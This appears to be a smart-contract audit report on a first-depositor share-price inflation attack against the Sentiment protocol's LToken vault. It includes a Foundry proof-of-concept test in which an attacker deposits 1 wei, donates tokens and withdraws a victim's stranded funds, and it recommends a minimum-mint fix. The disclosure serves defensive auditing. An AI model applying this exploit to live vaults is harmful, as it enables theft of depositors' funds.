TomJ
# An early lender can manipulate LToken asset per share price and might be able to steal funds of future lenders

## Summary
A malicious early lender can manipulate LToken asset per share price which will cause DOS for future lenders.
Also malicious lender might be able to steal funds from future lenders when future lenders mistakenly withdraw their deposit tokens.

## Vulnerability Detail
- A malicious early lender `LToken.sol:deposit()` with 1 wei of underlying token as first depositer of the LToken and mint 1 share
- A malicious lender transfers 10K (or more) underlying tokens to LToken contract to inflate the share's price
- Now any future lenders have to deposit 10001 tokens or more to deposit to LToken which will cause DOS to LToken contract
- If future lenders deposit 10001 tokens but mistakenly withdraw 10000 or less token, lender's share will be 0 and will not be able to withdraw remaining tokens
- A malicious lender will withdraw their 10001 token and also future lender's remaining tokens

Below is PoC showing malicious lender causing DOS to LToken contract and stealing future lender's remaining tokens
Insert this test into LToken.t.sol
```
    function testAttack() public {
        //mint 10001 tokens for both lender(attacker) and owner(victim)
        erc20.mint(lender, 10001);
        erc20.mint(owner, 10001);

        cheats.prank(lender);
        erc20.approve(address(lErc20), type(uint).max);
        cheats.prank(owner);
        erc20.approve(address(lErc20), type(uint).max);

        //lender(attacker) deposit 1 token for 1 share and send 10000 tokens to the LToken account
        //Any future lenders now has to deposit 10001 or more tokens to be able to deposit
        cheats.startPrank(lender);
        lErc20.deposit(1, lender);
        erc20.transfer(address(lErc20), 10000);
        cheats.stopPrank();

        //owner(victim) deposit 10001 token for 1 share
        //But mistakenly withdraw only 1 token (remaining 10000 token are now lost)
        cheats.prank(owner);
        lErc20.deposit(10001, owner);
        cheats.prank(owner);
        lErc20.withdraw(1, owner, owner);

        //lender(attacker) withdraw their 10001 token and also owner's 10000 tokens
        cheats.startPrank(lender);
        lErc20.withdraw(20001, lender, lender);
        cheats.stopPrank();

        assertEq(erc20.balanceOf(owner), 1);
        assertEq(lErc20.balanceOf(owner), 0);

        assertEq(erc20.balanceOf(lender), 20001);
        assertEq(lErc20.balanceOf(owner), 0);
    }

```

## Impact
It will cause DOS for LToken and future lenders might end up losing their funds.

## Code Snippet
https://github.com/sherlock-audit/2022-08-sentiment-TomJ-BB/blob/82066aae2d33a0f9ecbd57fea0f11f5579613df8/protocol/src/tokens/utils/ERC4626.sol#L126-L130

## Tool used
Manual Review

## Recommendation
Consider requiring a minimal amount of share tokens to be minted for the first minter or implement logic such as Uniswap V2 does.
Reference: https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L119-L124